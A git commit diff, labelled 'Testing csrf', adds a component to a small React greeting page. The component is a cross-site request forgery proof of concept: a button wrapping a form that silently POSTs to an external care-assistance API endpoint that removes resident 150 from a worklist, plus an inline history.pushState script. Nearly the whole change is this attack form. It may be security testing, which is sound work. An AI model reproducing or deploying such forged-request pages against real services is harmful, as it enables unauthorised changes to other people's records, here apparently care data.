e9189c7c48ebd751025be91c6027c50d78144e9a
kbendel <kevinbendel@hotmail.com>
2023-01-03 17:19:10 +0000

    Testing csrf

--- src/App.js
+++ src/App.js
@@ -9,8 +9,20 @@ function App() {
         <img src={Shakopee_Old_Map} className="App-logo" alt="logo" />
         <marquee><h1>Hello from Savage, MN!</h1></marquee>
       </header>
+      <Square/>
     </div>
   );
+}
+
+function Square() {
+    return (
+      <button className="square">
+        <script>history.pushState('', '', '/')</script>
+    <form action="https://devcorp.mdiachieve.com:8089/careassist/api/worklist/removeResidentFromWorklist/150" method="POST">
+      <input type="submit" value="Submit request" />
+    </form>
+      </button>
+    );
 }
 
 export default App;
